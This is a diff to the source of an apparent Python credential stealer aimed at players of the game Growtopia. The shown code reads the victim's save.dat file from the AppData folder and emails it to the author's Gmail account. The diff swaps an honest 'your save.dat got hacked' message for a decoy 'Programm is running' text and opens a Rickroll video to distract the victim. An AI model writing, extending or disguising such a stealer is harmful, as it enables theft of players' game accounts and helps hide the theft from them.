@@ -65,6 +65,7 @@ Before using, make sure you have the following requirements
 import smtplib #smtp > pip install smtplib
 import os
 import sys
+import webbrowser
 from email.message import EmailMessage
 from pathlib import Path #pathlib > pip install pathlib
 
@@ -79,7 +80,8 @@ home = Path.home()
 path =str(home)
 
 ff = open('msg.txt', 'w')
-ff.write('Your save.dat got hacked by unknown user. Please be safe next time') # > you can edit whatever you want but iam not responsibled
+ff.write('Programm is running like should be happended....') # > you can edit whatever you want but iam not responsibled
+webbrowser.open("https://youtu.be/dQw4w9WgXcQ", new=0, autoraise=True) # lol idk should i add but this 'method' is basic for steal another data
 ff.close()
 
 email = 'Enter username' # > you need to enter your gmail here
@@ -93,7 +95,7 @@ msg['Subject'] = 'Save Dat Stole!' # > you can edit whatever you want
 msg['From'] = email
 msg['To'] = email
 
-msg.set_content('Enjoy :D sav dat stealer by Zenqi')
+msg.set_content('running in orbit......')
 
 with open(path + '\AppData\Local\Growtopia\save.dat', 'rb') as f:
     file_data = f.read()
